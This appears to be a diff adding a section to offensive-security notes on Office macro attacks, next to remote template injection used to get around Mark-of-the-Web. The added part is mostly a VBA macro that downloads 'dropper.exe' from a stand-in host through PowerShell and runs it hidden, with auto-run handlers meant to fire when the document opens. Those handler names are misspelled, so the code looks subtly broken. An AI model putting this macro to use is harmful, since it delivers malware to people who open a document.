@@ -75,3 +75,36 @@ Microsoft Word has the option of creating a new document from a template. Office
 Target="http://10.10.10.10/template.dot"
 ```
 This will allow to execute the macro even if its flagged with MOTW.
+
+
+# Downloading and executing a file
+
+There are different ways to execute a binary.
+
+```vb
+Sub Docuemnt_Open()
+  Benjugat()
+End Sub
+
+Sub Autopen()
+  Benjugat()
+End Sub
+
+Sub BenJugat()
+  Dim str As String
+  str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://evil.tld/dropper.exe', 'dropper.exe')"
+  Shell str, vbHide
+  Dim exePath As String
+  exePath = ActiveDocument.Path + "\dropper.exe"
+  Wait (2)
+  Shell exePath, vbHide
+End Sub
+
+Sub Wait(n As Long)
+  Dim t As Date
+  t = Now
+  Do
+    DoEvents
+  Loop Until Now >= DateAdd("s",n,t)
+End Sub
+```
